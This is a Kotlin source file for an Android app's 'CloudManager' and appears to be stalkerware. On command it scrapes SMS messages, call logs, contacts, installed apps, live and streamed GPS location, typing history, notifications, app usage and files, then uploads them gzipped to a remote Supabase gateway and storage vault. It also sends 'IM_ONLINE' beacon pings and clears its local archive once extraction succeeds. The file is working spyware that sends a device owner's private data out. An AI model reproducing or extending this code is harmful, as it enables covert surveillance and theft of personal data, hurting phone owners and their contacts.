package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CloudManager {

    // Modular Upload: Takes a list of features to upload (e.g. ["sms:20", "location"] or ["ALL"])
    suspend fun uploadData(ctx: Context, modules: List<String>) {
        withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")

                val moduleMap = modules.associate {
                    val parts = it.split(":")
                    parts[0].trim().lowercase() to (parts.getOrNull(1)?.toIntOrNull() ?: -1)
                }
                
                // Check Global Config before uploading
                if (!ConfigManager.canUpload(ctx)) {
                    DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
                    return@withContext
                }

                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)

                val fcmToken = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE).getString("fcm_token", null)
                if (fcmToken != null) json.put("fcm_token", fcmToken)
                json.put("trigger", "MANUAL_FETCH")
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = moduleMap.containsKey("all")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || moduleMap.containsKey("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                }

                // --- MODULE 2: SMS ---
                if (isAll || moduleMap.containsKey("sms")) {
                    val limit = moduleMap["sms"] ?: -1
                    if (limit > 0) {
                        // ACTIVE FETCH: Scrape DB directly for X latest items
                        json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
                        json.put("fetch_mode", "ACTIVE_DB_SCRAPE")
                    } else {
                        // PASSIVE: Send cached logs
                        json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
                    }
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                }

                // --- MODULE 3: USAGE ---
                if (isAll || moduleMap.containsKey("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val startToday = TimeManager.getStartOfDay()
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                     val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                         stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                     )
                     json.put("screen_time_minutes", totalMins)
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || moduleMap.containsKey("location")) {
                    val streamDuration = modules.find { it.startsWith("location:stream:") }?.split(":")?.getOrNull(2)?.toLongOrNull()
                    
                    if (streamDuration != null) {
                        // STREAM MODE: Start BeaconService in high-freq location mode
                        DebugLogger.log("STREAM", "Starting Location Stream: ${streamDuration}m")
                        val intent = android.content.Intent(ctx, BeaconService::class.java).apply {
                            putExtra("duration_mins", streamDuration)
                            putExtra("mode", "LOCATION_STREAM")
                        }
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                        else ctx.startService(intent)
                        json.put("location_status", "STREAM_STARTED_${streamDuration}M")
                    } else {
                        // ACTIVE FETCH: Try to get one fresh GPS fix now
                        try {
                            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
                            if (PermissionManager.hasBackgroundLocation(ctx)) {
                                val freshLoc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
                                if (freshLoc != null) {
                                    json.put("location_fresh", JSONObject().apply {
                                        put("lat", freshLoc.latitude); put("lon", freshLoc.longitude)
                                        put("acc", freshLoc.accuracy); put("ts", System.currentTimeMillis())
                                    })
                                }
                            }
                        } catch (e: Exception) { }
                    }
                    json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", JSONArray(prefs.getString("typing_history", "[]")))
                }
                
                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: PHONE (FORENSIC) ---
                if (isAll || modules.contains("phone")) {
                     json.put("calls", PhoneManager.getCallLogs(ctx))
                     json.put("contacts", PhoneManager.getContacts(ctx))
                     json.put("apps", AppListManager.getInstalledApps(ctx))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    json.put("file_skeleton", FileManager.generateReport())
                }
                
                // --- MODULE 9: NOTIFICATIONS ---
                if (isAll || modules.contains("notifications")) {
                     json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
                }

                // --- SUMMARY STATS AGGREGATION ---
                val summary = JSONObject()
                val distKm = prefs.getFloat("total_distance_km", 0f)
                summary.put("location_dist_km", distKm)
                
                val typeStats = TypingManager.getStats(ctx)
                summary.put("typing_chars", typeStats.getInt("total_chars"))
                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
                
                val phoneStats = PhoneManager.getStats(ctx)
                summary.put("call_duration_sec", phoneStats.totalDuration)
                summary.put("call_count_total", phoneStats.totalCalls)
                summary.put("contact_count", phoneStats.contactCount)
                
                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                summary.put("app_switch_count", UsageManager.getSwitchCount(ctx))
                
                json.put("summary_stats", summary)

                // SEND TO SUPABASE
                val wrapper = JSONObject()
                wrapper.put("action", "upload_stats")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                // CRITICAL: GZIP streams must be finished and flushed before checking ResponseCode
                conn.outputStream.use { os ->
                    java.util.zip.GZIPOutputStream(os).use { gzip ->
                        val sanitized = wrapper.toString().replace("\\u0000", "")
                        gzip.write(sanitized.toByteArray(Charsets.UTF_8))
                        gzip.finish() 
                    }
                }

                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                } else {
                    DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                    // Mark queue as complete AND clean up vault only on success
                    if (json.has("historical_sms")) {
                        prefs.edit().putBoolean("historical_sms_dumped", true).apply()
                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                        if (vaultFile.exists()) vaultFile.delete()
                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced. Vault cleared.")
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CLOUD_FATAL", "Raw Upload Error:\n${e.stackTraceToString()}")
            }
        }
    }

    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
    fun collectDumpData(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. System Vitals
        json.put("static", DeviceManager.getStaticInfo(ctx))
        json.put("health", DeviceManager.getHealthStats(ctx))
        
        // 2. STREAM LOGGING RECOVERY
        json.put("stream_logs_status", "Delegated to Survivor Protocol (Streamed to Vault)")
        
        // 3. Persistent Data (The Deep Dive)
        json.put("calls", PhoneManager.getCallLogs(ctx))
        json.put("contacts", PhoneManager.getContacts(ctx))
        json.put("apps", AppListManager.getInstalledApps(ctx))



        return json
    }

    // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
    fun sendPing(ctx: Context, note: String = "Online", extraData: JSONObject? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                val batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

                val payload = JSONObject()
                payload.put("device_model", android.os.Build.MODEL)
                payload.put("battery_level", batteryLevel)
                payload.put("trigger", "BEACON")
                payload.put("note", note)
                
                extraData?.keys()?.forEach { key -> payload.put(key, extraData.get(key)) }
                
                val summary = JSONObject()
                summary.put("status", "ONLINE")
                payload.put("summary_stats", summary)

                val wrapper = JSONObject()
                wrapper.put("action", "ping")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", payload)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                                val sanitizedJson = wrapper.toString().replace("\\u0000", "")
                conn.outputStream.use { it.write(sanitizedJson.toByteArray()) }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Ping Failed: $code | $err")
                } else {
                    DebugLogger.log("BEACON", "Ping sent ($note). Code: $code")
                }
            } catch (e: Exception) {
                DebugLogger.log("BEACON_FATAL", "Raw Ping Error:\n${e.stackTraceToString()}")
            }
        }
    }

    // --- SYNCHRONOUS FILE UPLOAD (OOM-SAFE STREAMING MULTIPART) ---
    suspend fun uploadFile(ctx: Context, file: java.io.File, category: String = "GENERAL"): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                val timestamp = System.currentTimeMillis()
                // Construct direct storage path: device_id/category/timestamp_filename
                val storagePath = "$deviceId/$category/${timestamp}_${file.name}"
                
                val supabaseUrl = SecretVault.getStorageUrl(ctx, "cortex-vault", storagePath)
                val supabaseKey = SecretVault.getLock(ctx)

                DebugLogger.log("CLOUD", "Direct Storage Pipe Open: ${file.name}")

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/gzip")
                conn.setRequestProperty("x-upsert", "true")
                conn.doOutput = true
                
                // Tell the OS we're streaming binary data directly
                conn.setFixedLengthStreamingMode(file.length())

                file.inputStream().use { input ->
                    conn.outputStream.use { output ->
                        input.copyTo(output, 8192)
                    }
                }
                
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Stream Upload Failed (${file.name}): $code | $err")
                    return@withContext false
                } else {
                    DebugLogger.log("CLOUD", "Stream Upload ${file.name} Success. Registering...")
                    // Register file in database so it shows up in Vault
                    val reg = JSONObject()
                    reg.put("action", "register_file")
                    reg.put("deviceId", deviceId)
                    val p = JSONObject()
                    p.put("file_name", file.name)
                    p.put("file_path", storagePath)
                    p.put("category", category)
                    p.put("file_size", file.length())
                    reg.put("payload", p)
                    
                    val regUrl = URL(SecretVault.getGatewayUrl(ctx))
                    val regConn = regUrl.openConnection() as HttpURLConnection
                    regConn.requestMethod = "POST"
                    regConn.setRequestProperty("apikey", supabaseKey)
                    regConn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                    regConn.setRequestProperty("Content-Type", "application/json")
                    regConn.doOutput = true
                    regConn.outputStream.use { it.write(reg.toString().toByteArray()) }
                    DebugLogger.log("CLOUD", "File Registry Status: ${regConn.responseCode}")
                    return@withContext true
                }
            } catch (e: Exception) {
                DebugLogger.log("CLOUD_FATAL", "Stream Upload Fatal:\n${e.stackTraceToString()}")
                return@withContext false
            }
        }
    }

    suspend fun uploadSkeleton(ctx: Context, json: JSONObject) {
        withContext(Dispatchers.IO) {
            try {
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                
                val wrapper = JSONObject()
                wrapper.put("action", "upload_skeleton")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true

                java.util.zip.GZIPOutputStream(conn.outputStream).use { gzip ->
                    gzip.write(wrapper.toString().toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Skeleton Failed: $code | $err")
                } else {
                    DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")
                }
            } catch (e: Exception) {
                DebugLogger.log("SKELETON_FATAL", "Raw Skeleton Error:\n${e.stackTraceToString()}")
            }
        }
    }
}
